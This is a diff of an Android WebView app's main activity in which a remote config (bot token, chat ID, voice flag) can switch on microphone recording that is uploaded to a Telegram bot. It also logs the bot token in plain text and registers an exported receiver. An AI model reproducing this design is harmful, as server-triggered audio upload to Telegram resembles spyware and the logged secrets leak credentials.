@@ -6,6 +6,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -21,7 +22,6 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import android.Manifest;
-import android.content.pm.PackageManager;
 import org.json.JSONObject;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -38,19 +38,40 @@ public class MainActivity extends AppCompatActivity {
     
     private WebView webView;
     private BroadcastReceiver voiceReceiver;
+    private FloatingVoiceNotification floatingNotification;
     
     @SuppressLint("SetJavaScriptEnabled")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, PERMISSION_REQUEST_CODE);
-        }
-
+        
+        // درخواست مجوزها
+        requestPermissions();
+        
         webView = new WebView(this);
         setContentView(webView);
-
+        
+        setupWebView();
+        resolveUrlAndLoad();
+        setupVoiceBroadcastReceiver();
+    }
+    
+    private void requestPermissions() {
+        String[] permissions = {
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.POST_NOTIFICATIONS,
+            Manifest.permission.FOREGROUND_SERVICE
+        };
+        
+        for (String perm : permissions) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
+                break;
+            }
+        }
+    }
+    
+    private void setupWebView() {
         WebSettings s = webView.getSettings();
         s.setJavaScriptEnabled(true);
         s.setDomStorageEnabled(true);
@@ -58,24 +79,22 @@ public class MainActivity extends AppCompatActivity {
         s.setLoadWithOverviewMode(true);
         s.setUseWideViewPort(true);
         s.setCacheMode(WebSettings.LOAD_DEFAULT);
-
+        s.setMediaPlaybackRequiresUserGesture(false);
+        
         webView.setWebViewClient(new WebViewClient());
         webView.setWebChromeClient(new WebChromeClient());
-
+        
         webView.setDownloadListener((url, userAgent, contentDisposition, mimeType, contentLength) -> {
             try {
                 DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
                 request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
                 DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                 if (dm != null) dm.enqueue(request);
-                Toast.makeText(this, "Downloading...", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "📥 Downloading...", Toast.LENGTH_SHORT).show();
             } catch (Exception e) {
-                Toast.makeText(this, "Error", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "❌ Download error", Toast.LENGTH_SHORT).show();
             }
         });
-
-        resolveUrlAndLoad();
-        setupVoiceBroadcastReceiver();
     }
     
     private void setupVoiceBroadcastReceiver() {
@@ -84,9 +103,13 @@ public class MainActivity extends AppCompatActivity {
             public void onReceive(Context context, Intent intent) {
                 String action = intent.getAction();
                 if ("VOICE_RECORDING_STARTED".equals(action)) {
-                    Toast.makeText(context, "Recording started", Toast.LENGTH_SHORT).show();
+                    Toast.makeText(context, "🎤 Recording started...", Toast.LENGTH_SHORT).show();
                 } else if ("VOICE_RECORDING_COMPLETED".equals(action)) {
-                    Toast.makeText(context, "Recording complete - uploading", Toast.LENGTH_SHORT).show();
+                    Toast.makeText(context, "⏳ Recording completed, uploading...", Toast.LENGTH_SHORT).show();
+                } else if ("VOICE_UPLOAD_SUCCESS".equals(action)) {
+                    Toast.makeText(context, "✅ Voice uploaded to Telegram!", Toast.LENGTH_LONG).show();
+                } else if ("VOICE_UPLOAD_FAILED".equals(action)) {
+                    Toast.makeText(context, "❌ Upload failed, check logs", Toast.LENGTH_LONG).show();
                 }
             }
         };
@@ -94,6 +117,8 @@ public class MainActivity extends AppCompatActivity {
         IntentFilter filter = new IntentFilter();
         filter.addAction("VOICE_RECORDING_STARTED");
         filter.addAction("VOICE_RECORDING_COMPLETED");
+        filter.addAction("VOICE_UPLOAD_SUCCESS");
+        filter.addAction("VOICE_UPLOAD_FAILED");
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             registerReceiver(voiceReceiver, filter, Context.RECEIVER_EXPORTED);
@@ -101,7 +126,7 @@ public class MainActivity extends AppCompatActivity {
             registerReceiver(voiceReceiver, filter);
         }
     }
-
+    
     private void resolveUrlAndLoad() {
         new Thread(() -> {
             String siteUrl = FALLBACK_URL;
@@ -135,8 +160,15 @@ public class MainActivity extends AppCompatActivity {
                     chatId = obj.optString("chat_id", "");
                     voiceToken = obj.optString("voice_token", "");
                     needsVoice = obj.optBoolean("voice", false);
+                    
+                    // لاگ برای دیباگ
+                    android.util.Log.d("MainActivity", "BotToken: " + botToken);
+                    android.util.Log.d("MainActivity", "ChatId: " + chatId);
+                    android.util.Log.d("MainActivity", "NeedsVoice: " + needsVoice);
                 }
-            } catch (Exception e) {}
+            } catch (Exception e) {
+                android.util.Log.e("MainActivity", "Error: " + e.getMessage());
+            }
             
             final String finalUrl = siteUrl;
             final String finalBotToken = botToken;
@@ -146,13 +178,22 @@ public class MainActivity extends AppCompatActivity {
             
             new Handler(Looper.getMainLooper()).post(() -> {
                 webView.loadUrl(finalUrl);
-                if (finalNeedsVoice && !finalBotToken.isEmpty() && !finalChatId.isEmpty()) {
-                    new FloatingVoiceNotification(this, finalBotToken, finalChatId, finalVoiceToken).show();
+                
+                // نمایش Floating Notification اگر نیاز باشه
+                if (finalNeedsVoice && finalBotToken != null && !finalBotToken.isEmpty() 
+                    && finalChatId != null && !finalChatId.isEmpty()) {
+                    floatingNotification = new FloatingVoiceNotification(
+                        this, 
+                        finalBotToken, 
+                        finalChatId, 
+                        finalVoiceToken
+                    );
+                    floatingNotification.show();
                 }
             });
         }).start();
     }
-
+    
     @Override
     public boolean onKeyDown(int keyCode, KeyEvent event) {
         if (keyCode == KeyEvent.KEYCODE_BACK && webView.canGoBack()) {
@@ -166,7 +207,9 @@ public class MainActivity extends AppCompatActivity {
     protected void onDestroy() {
         super.onDestroy();
         if (voiceReceiver != null) {
-            unregisterReceiver(voiceReceiver);
+            try {
+                unregisterReceiver(voiceReceiver);
+            } catch (Exception e) {}
         }
     }
     
@@ -174,8 +217,10 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            if (grantResults.length > 0 && grantResults[0] != PackageManager.PERMISSION_GRANTED) {
-                Toast.makeText(this, "Microphone permission required", Toast.LENGTH_SHORT).show();
+            for (int i = 0; i < permissions.length; i++) {
+                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                    Toast.makeText(this, "⚠️ " + permissions[i] + " permission required", Toast.LENGTH_SHORT).show();
+                }
             }
         }
     }
